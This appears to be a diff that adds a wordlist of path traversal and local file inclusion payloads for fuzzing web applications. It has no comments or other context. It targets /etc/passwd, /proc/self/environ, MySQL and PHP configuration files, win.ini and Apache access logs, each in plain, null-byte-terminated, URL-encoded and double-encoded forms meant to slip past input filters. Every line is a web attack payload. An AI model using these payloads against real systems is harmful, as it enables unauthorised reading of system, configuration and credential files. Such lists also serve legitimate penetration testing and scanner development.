@@ -1,0 +1,48 @@
+/etc/passwd
+/etc/passwd%00
+%2E%2E%2F/etc/passwd
+%252E%252E%252F/etc/passwd
+/etc/my.cnf
+/etc/my.cnf%00
+%2E%2E%2F/etc/my.cnf
+%252E%252E%252F/etc/my.cnf
+/etc/httpd/php.ini
+/etc/httpd/php.ini%00
+%2E%2E%2F/etc/httpd/php.ini
+%252E%252E%252F/etc/httpd/php.ini
+/etc/profile
+/etc/profile%00
+%2E%2E%2F/etc/profile
+%252E%252E%252F/etc/profile
+/proc/self/environ
+/proc/self/environ%00
+%2E%2E%2F/proc/self/environ
+%252E%252E%252F/proc/self/environ
+/proc/version
+/proc/version%00
+%2E%2E%2F/proc/version
+%252E%252E%252F/proc/version
+\WINDOWS\win.ini
+\WINDOWS\win.ini%00
+%2E%2E%2F\WINDOWS\win.ini
+%252E%252E%252F\WINDOWS\win.ini
+\WINDOWS\php.ini
+\WINDOWS\php.ini%00
+%2E%2E%2F\WINDOWS\php.ini
+%252E%252E%252F\WINDOWS\php.ini
+\xampp\phpMyAdmin\phpinfo.php
+\xampp\phpMyAdmin\phpinfo.php%00
+%2E%2E%2F\xampp\phpMyAdmin\phpinfo.php
+%252E%252E%252F\xampp\phpMyAdmin\phpinfo.php
+C:\Program Files\Apache Group\Apache\logs\access.log
+C:\Program Files\Apache Group\Apache\logs\access.log%00
+%2E%2E%2FC:\Program Files\Apache Group\Apache\logs\access.log
+%252E%252E%252FC:\Program Files\Apache Group\Apache\logs\access.log
+C:\Program Files\wamp\apache2\logs
+C:\Program Files\wamp\apache2\logs%00
+%2E%2E%2FC:\Program Files\wamp\apache2\logs
+%252E%252E%252FC:\Program Files\wamp\apache2\logs
+C:\APM_Setup\Server\Apache\logs\access.log
+C:\APM_Setup\Server\Apache\logs\access.log%00
+%2E%2E%2FC:\APM_Setup\Server\Apache\logs\access.log
+%252E%252E%252FC:\APM_Setup\Server\Apache\logs\access.log
